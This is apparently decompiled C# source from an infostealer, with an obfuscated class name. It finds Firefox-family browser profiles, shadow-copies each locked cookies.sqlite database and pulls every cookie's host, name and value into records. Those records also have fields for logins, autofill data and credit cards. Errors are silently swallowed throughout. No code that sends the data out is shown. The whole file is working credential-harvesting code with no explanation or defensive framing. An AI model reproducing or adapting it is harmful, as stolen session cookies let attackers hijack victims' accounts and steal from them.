using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000006 RID: 6
public static class g_E_c_к_0
{
	// Token: 0x06000019 RID: 25 RVA: 0x000052E0 File Offset: 0x000034E0
	public static List<Browser> TryFind(IList<string> paths)
	{
		List<Browser> list = new List<Browser>();
		try
		{
			foreach (string baseDirectory in from x in paths
			select Environment.ExpandEnvironmentVariables(x))
			{
				try
				{
					foreach (string text in FileCopier.FindPaths(baseDirectory, 2, 1, new string[]
					{
						"cookies.sqlite"
					}))
					{
						string fullName = new FileInfo(text).Directory.FullName;
						string text2 = text.Contains(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming")) ? g_E_c_к_0.GeckoRoamingName(fullName) : g_E_c_к_0.GeckoLocalName(fullName);
						if (!string.IsNullOrEmpty(text2))
						{
							Browser browser = new Browser
							{
								BrowserName = text2,
								BrowserProfile = new DirectoryInfo(fullName).Name,
								Cookies = new List<ScannedCookie>(g_E_c_к_0.EnumCook(fullName)),
								Logins = new List<Account>(),
								Autofills = new List<Autofill>(),
								CC = new List<CC>()
							};
							if (!browser.IsEmpty())
							{
								list.Add(browser);
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x0600001A RID: 26 RVA: 0x000054A8 File Offset: 0x000036A8
	private static List<ScannedCookie> EnumCook(string profile)
	{
		List<ScannedCookie> list = new List<ScannedCookie>();
		try
		{
			string text = Path.Combine(profile, "cookies.sqlite");
			if (!File.Exists(text))
			{
				return list;
			}
			using (FileCopier fileCopier = new FileCopier())
			{
				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
				dbFactory.ReadContextTable("moz_cookies");
				for (int i = 0; i < dbFactory.RowLength; i++)
				{
					ScannedCookie scannedCookie = null;
					try
					{
						scannedCookie = new ScannedCookie
						{
							Host = dbFactory.GatherValue(i, "host").Trim(),
							Http = (dbFactory.GatherValue(i, "host").Trim()[0] == '.'),
							Path = dbFactory.GatherValue(i, "path").Trim(),
							Secure = (dbFactory.GatherValue(i, "isSecure")[0] == '1'),
							Expires = Convert.ToInt64(dbFactory.GatherValue(i, "expiry").Trim()),
							Name = dbFactory.GatherValue(i, "name").Trim(),
							Value = dbFactory.GatherValue(i, "value")
						};
					}
					catch
					{
					}
					if (scannedCookie != null)
					{
						list.Add(scannedCookie);
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600001B RID: 27 RVA: 0x00005684 File Offset: 0x00003884
	public static string GeckoRoamingName(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables("%appdata%\\"), string.Empty);
			string[] array = profilesDirectory.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			if (array[2] == "Profiles")
			{
				result = array[1];
			}
			else
			{
				result = array[0];
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x0600001C RID: 28 RVA: 0x000056FC File Offset: 0x000038FC
	public static string GeckoLocalName(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables("%localappdata%\\"), string.Empty);
			string[] array = profilesDirectory.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			if (array[2] == "Profiles")
			{
				result = array[1];
			}
			else
			{
				result = array[0];
			}
		}
		catch
		{
		}
		return result;
	}
}
